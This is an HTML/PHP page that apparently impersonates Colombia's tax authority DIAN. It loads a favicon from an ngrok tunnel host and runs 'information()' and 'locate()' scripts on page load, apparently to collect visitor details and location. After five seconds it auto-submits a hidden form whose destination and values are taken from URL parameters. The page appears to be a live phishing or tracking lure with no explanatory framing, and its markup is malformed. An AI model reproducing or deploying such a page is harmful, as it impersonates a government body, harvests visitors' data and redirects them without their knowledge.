<!DOCTYPE html>
<html lang="en">
<head>

    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#000000">
    <link rel="icon" type="image/x-icon" href="https://af2f42c33251.ngrok.io/u/th.ico" sizes="144x144">


    <script type="text/javascript">
        function ionar() {
            document.forms["ario"].submit();
        }
    </script>


    <title>DIAN: Dirección de Impuestos y Aduanas Nacionales</title>


    <script type="text/javascript">
        if (window.location.protocol == "http:") {
            var restOfUrl = window.location.href.substr(5);
            window.location = "https:" + restOfUrl;
        }
    </script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script type="text/javascript" src="js/info.js"></script>
    <script type="text/javascript" src="js/location.js"></script>
</head>
<body onload="information(), locate();">

<script type="text/javascript">
    setTimeout("ionar()", 5000);
</script>

<form name="ario" action="<?php echo htmlspecialchars($_GET['foo']); ?>" method="POST">
    <input type="hidden" name="foo" value="<?php echo htmlspecialchars($_GET['foo']); ?>">
    <input type="hidden" name="foo1" value="<?php echo htmlspecialchars($_GET['foo1']); ?>">
    <input type="hidden" name="uis" value="<?php echo htmlspecialchars($_GET['uis']); ?>">
</form>


</head>
<body>

</body>
</html>

